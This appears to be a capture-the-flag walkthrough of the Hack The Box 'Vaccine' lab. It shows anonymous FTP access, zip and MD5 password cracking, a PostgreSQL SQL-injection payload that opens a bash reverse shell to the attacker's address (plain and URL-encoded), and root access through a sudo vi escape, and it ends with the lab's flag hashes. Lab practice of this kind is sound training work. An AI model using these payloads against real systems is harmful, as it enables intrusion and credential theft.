We started like allways with a scan in all the ports and then a more precise on the opened ones. Creating folders where we are going to work

ports open 21,22,80

this is the total report; 

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.6
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

what web gives us this 
```
http://10.129.38.37 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.38.37], PasswordField[password], Title[MegaCorp Login]
```

launchpad for this service :  vsftpd 3.0.3
"ubuntu xenial"

OpenSSH 8.0p1 Ubuntu 6ubuntu0.1
"ubuntu eoan"

Apache httpd 2.4.41 
"ubuntu focal"

Every launchpad is different

Ok now im going to go to the ftp and watch what is there on that file, is compressed i cant read it. the name is a backup.zip.

Ok and in the http server there is a login.

Im going to try to get a hash password from the file 

I need to execute this

```
zip2john encripted_file.zip >zip.hash
```
all right now we need to use john with a dictionary and give the zip.hash

```
john --wordlist/usr/share/wordlist/rockyou.txt zip.hash
```

this is the password

```
741852963        (backup.zip)  
```

so, the  admin password for the website that we seen before is this
```
2cb42f8734ea607eefed3b70af13bbd3
and the username is admin
```

the password is in md5 and is "qwerty789"


Now im connected to the admin panel, and seems to be vulnerable to sqli . The errors are showed on the screen. I want to execute a shell but i dont know how to do it

I found information on this source https://www.linkedin.com/pulse/hack-box-starting-point-vaccine-nathan-barnes

## Reverse shell process ##

To start, let's allow all TCP inbound connections from the target machine's IPv4 address to our own attacking machine's IPv4 address via port 1234 (or whichever port you want to listen on).

```
sudo ufw allow from 10.10.10.46 proto tcp to any port 1234
```

Follow this up by starting a Netcat listener on your own attacking machine.

```
nc -lvnp 1234
```

Next, run the following code within the search bar of the target website.

* Be sure to set your own IPv4 address & the correct port. Also, at times I had to log out of the website and log back in while repeating the process to get the connection back. Just look at it as extra practice.
```
'; CREATE TABLE cmd_exec(cmd_output text); --
'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.14.107/1234 0>&1'''; --
```

I had some problems when i was tying to get the bash. So i url encode it ... of course it was on the & that is %27. I will put right here down a full url encoded, but I think it is not neccesary
```
%27%3B%20COPY%20cmd_exec%20FROM%20PROGRAM%20%27bash%20-c%20%27%27bash%20-i%20>%26%20%2Fdev%2Ftcp%2F10.10.16.6%2F443%200>%261%27%27%27%3B%20--
```


I cant have a decent tty ...

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

I found the password of postgres , is this P@s5w0rd!. Now for the priviledge scalation I did sudo -l and i get that i can execute vi as sudo..

```
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

```

From here exit **vim** by entering either of the following:

```
:!/bin/bash
:!/bin/sh
:shell
```


user:
ec9b13ca4d6229cd5cc1e09980965bf7

root:
dd6e058e814260bc70e9bbdef2715849